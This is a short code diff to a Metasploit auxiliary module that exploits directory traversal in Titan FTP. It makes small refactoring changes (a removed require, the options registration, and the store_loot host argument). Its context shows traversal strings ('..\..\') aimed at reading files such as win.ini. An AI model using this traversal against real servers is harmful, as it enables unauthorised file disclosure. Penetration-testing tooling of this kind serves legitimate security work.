@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::Ftp
@@ -46,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(21),
         OptString.new('TRAVERSAL', [ true, "String to traverse to the drive's root directory", "..\\..\\" ]),
         OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'windows\\win.ini'])
-      ], self.class)
+      ])
   end
 
 
@@ -98,7 +96,7 @@ class MetasploitModule < Msf::Auxiliary
     progress(file_size, file_size)
 
     fname = datastore['PATH'].gsub(/[\/\\]/, '_')
-    p = store_loot("titanftp.traversal", "text/plain", "rhost", file_data, fname)
+    p = store_loot("titanftp.traversal", "text/plain", ip, file_data, fname)
     print_status("Saved in: #{p}")
     vprint_status(file_data.inspect)
 
